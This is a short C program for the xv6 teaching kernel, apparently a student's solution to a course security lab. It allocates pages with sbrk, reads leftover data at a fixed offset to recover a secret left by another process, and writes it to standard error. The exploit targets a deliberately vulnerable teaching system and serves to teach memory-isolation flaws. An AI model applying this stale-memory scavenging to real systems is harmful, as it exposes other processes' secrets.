#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  printf("attack start\n");
  char *mem = sbrk(PGSIZE* 32);

  if (mem == (char *)-1) {
      fprintf(2, "sbrk failed\n");
      exit(1);
   }

  mem = mem + 16 * PGSIZE;
  // printf("secret_location: %s\n", secret_location);
    printf("end + 16 * PGSIZE: %p\n", mem);
  char *secret = mem + 32;
    printf("secret: %s\n", secret);
  write(2, secret, 8);

  // sbrk(-(pgsize));

  exit(1);
}
